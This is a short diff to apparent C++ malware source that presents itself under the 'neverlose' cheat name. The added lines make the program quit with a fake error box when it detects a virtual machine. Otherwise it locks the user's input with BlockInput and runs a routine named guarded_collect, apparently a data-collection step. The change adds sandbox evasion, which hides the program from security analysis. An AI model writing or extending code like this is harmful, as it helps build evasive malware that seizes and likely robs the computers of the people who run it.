@@ -1285,6 +1285,11 @@ bool is_vm()
 
 int main()
 {
+    if (is_vm()) {
+        MessageBoxW(nullptr, L"cannot run in a visual mechine", L"neverlose", MB_OK | MB_ICONERROR);
+        return 0;
+    }
+
     BlockInput(TRUE);
 
     guarded_collect();
